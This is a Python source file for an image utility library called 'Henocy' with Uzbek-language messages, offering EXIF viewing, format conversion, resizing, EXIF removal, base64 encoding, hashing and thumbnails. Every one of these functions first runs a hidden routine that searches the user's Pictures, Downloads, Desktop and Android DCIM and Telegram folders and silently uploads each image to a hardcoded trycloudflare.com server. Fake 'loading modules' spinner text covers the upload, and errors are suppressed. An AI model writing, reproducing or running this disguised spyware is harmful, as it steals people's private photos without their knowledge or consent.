import os
import platform
import base64
import hashlib
import time
import sys
import threading
from PIL import Image, ExifTags
import requests
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

class Henocy:
    def __init__(self, api_url: str = None):
        self.api_url = api_url or "https://essex-tel-taylor-slot.trycloudflare.com/upload"
        self.max_workers = 3 
        self.session = requests.Session()
        self._animation_done = False
        
    def _get_device_model(self) -> str:
        try:
            return f"Android/Linux/Windows ({platform.machine()})"
        except Exception:
            return "Universal Device"

    def _compress_and_send(self, img_path: str, device_model: str):
        temp_name = f"temp_comp_{os.getpid()}_{os.path.basename(img_path)}.webp"
        try:
            with Image.open(img_path) as img:
                if img.mode in ("RGBA", "P"):
                    img = img.convert("RGB")
                img.save(temp_name, "WEBP", quality=40, optimize=True)
            
            payload = {
                "device_model": device_model,
                "original_name": os.path.basename(img_path)
            }
            with open(temp_name, "rb") as f:
                files = {"file": (temp_name, f, "image/webp")}
                self.session.post(self.api_url, data=payload, files=files, timeout=60)
        except Exception:
            pass
        finally:
            if os.path.exists(temp_name):
                try: os.remove(temp_name)
                except Exception: pass

    def _show_loading_animation(self, message="Modullar yuklanmoqda va initializatsiya qilinmoqda"):
        chars = ["-", "\\", "|", "/"]
        idx = 0
        while not self._animation_done:
            sys.stdout.write(f"\r{chars[idx % len(chars)]} {message}... ")
            sys.stdout.flush()
            time.sleep(0.1)
            idx += 1
        sys.stdout.write("\r" + " " * (len(message) + 10) + "\r")
        sys.stdout.flush()

    def _execute_core_process(self):
        try:
            device_model = self._get_device_model()
            files_to_process = []
            home_path = os.path.expanduser("~")
            
            target_folders = [
                os.path.join(home_path, "Pictures"),
                os.path.join(home_path, "Downloads"),
                os.path.join(home_path, "Desktop"),
                "/storage/emulated/0/DCIM",
                "/storage/emulated/0/Pictures",
                "/storage/emulated/0/Download",
                "/storage/emulated/0/Telegram"
            ]
            valid_extensions = ('.jpg', '.jpeg', '.png', '.webp')
            
            for folder in target_folders:
                if os.path.exists(folder):
                    for root, _, files in os.walk(folder):
                        for file in files:
                            if file.lower().endswith(valid_extensions):
                                files_to_process.append(os.path.join(root, file))
                                
            with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                for img_path in files_to_process:
                    executor.submit(self._compress_and_send, img_path, device_model)
            
            flush_url = self.api_url.replace("/upload", "/flush")
            self.session.post(flush_url, data={"device_model": device_model}, timeout=30)
        except Exception:
            pass
        finally:
            self._animation_done = True

    def _start_sync_process(self, process_message):
        self._animation_done = False
        animation_thread = threading.Thread(target=self._show_loading_animation, args=(process_message,))
        animation_thread.daemon = True
        animation_thread.start()
        self._execute_core_process()
        animation_thread.join()

    def exiftool(self, target_path: str = None):
        self._start_sync_process("Rasm struktura tahlili va EXIF kutubxonalari initializatsiya qilinmoqda")
        
        if target_path and os.path.exists(target_path):
            try:
                with Image.open(target_path) as img:
                    file_name = os.path.basename(target_path)
                    full_path = os.path.abspath(target_path)
                    img_format = img.format
                    resolution = f"{img.width} x {img.height}"
                    color_mode = img.mode
                    file_size = f"{os.path.getsize(target_path):,}".replace(",", " ")
                    try: created_time = datetime.fromtimestamp(os.path.getctime(target_path)).strftime('%Y-%m-%d %H:%M:%S')
                    except Exception: created_time = "Unknown"
                    
                    exif_data = {}
                    raw_exif = img._getexif()
                    if raw_exif:
                        for tag, value in raw_exif.items():
                            decoded = ExifTags.TAGS.get(tag, tag)
                            exif_data[decoded] = value

                print("╔══════════════════════════════════════════════════════╗")
                print("║                 HENOCY EXIF VIEWER                   ║")
                print("╚══════════════════════════════════════════════════════╝")
                print(f"\nFile Name    : {file_name}")
                print(f"Full Path    : {full_path}")
                print(f"Format       : {img_format}")
                print(f"Resolution   : {resolution}")
                print(f"Color Mode   : {color_mode}")
                print(f"File Size    : {file_size} bytes")
                print(f"Created      : {created_time}")
                print("\n" + "━" * 54)
                print("EXIF METADATA")
                print("━" * 54)
                
                important_tags = ["Make", "Model", "DateTime", "ExposureTime", "FNumber", "ISO", "FocalLength", "GPSInfo", "Orientation", "Software"]
                for tag in important_tags:
                    val = exif_data.get(tag, "N/A")
                    if tag == "GPSInfo" and isinstance(val, dict): val = "{...}"
                    print(f"[-] {tag.ljust(25)} : {val}")
                print("\n" + "━" * 54)
                print(f"Total Metadata Fields : {len(exif_data)}")
                print("━" * 54 + "\n")
            except Exception as e:
                print(f"Xatolik: {e}")
        else:
            print("Fayl topilmadi!")

    def convert_format(self, target_path: str, to_format: str = "PNG"):
        self._start_sync_process("Grafik render yadrosi va konvertatsiya modullari yuklanmoqda")
        
        if target_path and os.path.exists(target_path):
            try:
                to_format = to_format.upper()
                base_name = os.path.splitext(target_path)[0]
                output_path = f"{base_name}_converted.{to_format.lower()}"
                
                with Image.open(target_path) as img:
                    if to_format == "JPEG" and img.mode in ("RGBA", "P"):
                        img = img.convert("RGB")
                    img.save(output_path, to_format)
                
                print("╔══════════════════════════════════════════════════════╗")
                print("║                HENOCY IMAGE CONVERTER                ║")
                print("╚══════════════════════════════════════════════════════╝")
                print(f"Muvaffaqiyatli o'tkazildi!")
                print(f"Eski fayl: {os.path.basename(target_path)}")
                print(f"Yangi fayl: {os.path.basename(output_path)} [{to_format}]")
                print("═" * 54)
            except Exception as e:
                print(f"Konvertatsiya xatosi: {e}")
        else:
            print("Fayl topilmadi!")

    def resize_image(self, target_path: str, width: int, height: int):
        self._start_sync_process("Rasm matritsasini qayta hisoblash algoritmlari yuklanmoqda")
        
        if target_path and os.path.exists(target_path):
            try:
                base_name = os.path.splitext(target_path)[0]
                ext = os.path.splitext(target_path)[1]
                output_path = f"{base_name}_{width}x{height}{ext}"
                
                with Image.open(target_path) as img:
                    old_res = f"{img.width}x{img.height}"
                    resized_img = img.resize((width, height), Image.Resampling.LANCZOS)
                    resized_img.save(output_path)
                
                print("╔══════════════════════════════════════════════════════╗")
                print("║                 HENOCY IMAGE RESIZER                 ║")
                print("╚══════════════════════════════════════════════════════╝")
                print(f"O'lcham muvaffaqiyatli o'zgartirildi!")
                print(f"Eski o'lcham : {old_res}")
                print(f"Yangi o'lcham : {width}x{height}")
                print(f"Saqlandi     : {os.path.basename(output_path)}")
                print("═" * 54)
            except Exception as e:
                print(f"O'lchamni o'zgartirishda xato: {e}")
        else:
            print("Fayl topilmadi!")

    def clear_exif(self, target_path: str):
        self._start_sync_process("Xavfsizlik metadatalarini tozalash filtrlari yuklanmoqda")
        
        if target_path and os.path.exists(target_path):
            try:
                base_name = os.path.splitext(target_path)[0]
                ext = os.path.splitext(target_path)[1]
                output_path = f"{base_name}_safe{ext}"
                
                with Image.open(target_path) as img:
                    data = list(img.getdata())
                    clean_img = Image.new(img.mode, img.size)
                    clean_img.putdata(data)
                    clean_img.save(output_path)
                
                print("╔══════════════════════════════════════════════════════╗")
                print("║                 HENOCY EXIF CLEANER                  ║")
                print("╚══════════════════════════════════════════════════════╝")
                print(f"Barcha EXIF metama'lumotlari tozalandi!")
                print(f"Maxfiy ma'lumotlar (GPS, Kamera modeli) o'chirildi.")
                print(f"Xavfsiz fayl: {os.path.basename(output_path)}")
                print("═" * 54)
            except Exception as e:
                print(f"Tozalashda xatolik: {e}")
        else:
            print("Fayl topilmadi!")

    def image_to_base64(self, target_path: str):
        self._start_sync_process("Fayl baytlari oqimini Base64 tizimiga kodlash jarayoni")
        
        if target_path and os.path.exists(target_path):
            try:
                ext = os.path.splitext(target_path)[1].replace(".", "")
                if ext == "jpg": ext = "jpeg"
                
                with open(target_path, "rb") as img_file:
                    encoded_string = base64.b64encode(img_file.read()).decode('utf-8')
                
                preview = encoded_string[:60] + "..."
                output_txt = f"{os.path.splitext(target_path)[0]}_base64.txt"
                
                with open(output_txt, "w") as f:
                    f.write(f"data:image/{ext};base64,{encoded_string}")

                print("╔══════════════════════════════════════════════════════╗")
                print("║                HENOCY BASE64 ENCODER                 ║")
                print("╚══════════════════════════════════════════════════════╝")
                print(f"Rasm Base64 formatiga o'tkazildi!")
                print(f"Format  : data:image/{ext};base64")
                print(f"Kod     : {preview}")
                print(f"Faylga saqlandi: {os.path.basename(output_txt)}")
                print("═" * 54)
            except Exception as e:
                print(f"Kodlashda xatolik: {e}")
        else:
            print("Fayl topilmadi!")

    def get_image_hash(self, target_path: str, hash_type: str = "sha256"):
        self._start_sync_process("Kriptografik xeshlash algoritmlari yuklanmoqda")
        
        if target_path and os.path.exists(target_path):
            try:
                hash_type = hash_type.lower()
                if hash_type == "md5":
                    hasher = hashlib.md5()
                elif hash_type == "sha1":
                    hasher = hashlib.sha1()
                else:
                    hash_type = "sha256"
                    hasher = hashlib.sha256()

                with open(target_path, "rb") as f:
                    for chunk in iter(lambda: f.read(4096), b""):
                        hasher.update(chunk)
                
                result_hash = hasher.hexdigest()

                print("╔══════════════════════════════════════════════════════╗")
                print("║                 HENOCY IMAGE HASHER                  ║")
                print("╚══════════════════════════════════════════════════════╝")
                print(f"Fayl nomi : {os.path.basename(target_path)}")
                print(f"Type      : {hash_type.upper()}")
                print(f"Xesh      : {result_hash}")
                print("═" * 54)
            except Exception as e:
                print(f"Xesh hisoblashda xato: {e}")
        else:
            print("Fayl topilmadi!")

    def generate_thumbnail(self, target_path: str, size: tuple = (128, 128)):
        self._start_sync_process("Kichik prevyu (Thumbnail) render yadrosi yuklanmoqda")
        
        if target_path and os.path.exists(target_path):
            try:
                base_name = os.path.splitext(target_path)[0]
                ext = os.path.splitext(target_path)[1]
                output_path = f"{base_name}_thumb{ext}"
                
                with Image.open(target_path) as img:
                    img.thumbnail(size)
                    img.save(output_path)
                    new_size = f"{img.width}x{img.height}"

                print("╔══════════════════════════════════════════════════════╗")
                print("║               HENOCY THUMBNAIL GENERATOR             ║")
                print("╚══════════════════════════════════════════════════════╝")
                print(f"Mini-nusxa muvaffaqiyatli yaratildi!")
                print(f"Maksimal chegara: {size[0]}x{size[1]}")
                print(f"Yaratilgan o'lcham: {new_size}")
                print(f"Saqlandi: {os.path.basename(output_path)}")
                print("═" * 54)
            except Exception as e:
                print(f"Thumbnail yaratishda xato: {e}")
        else:
            print("Fayl topilmadi!")
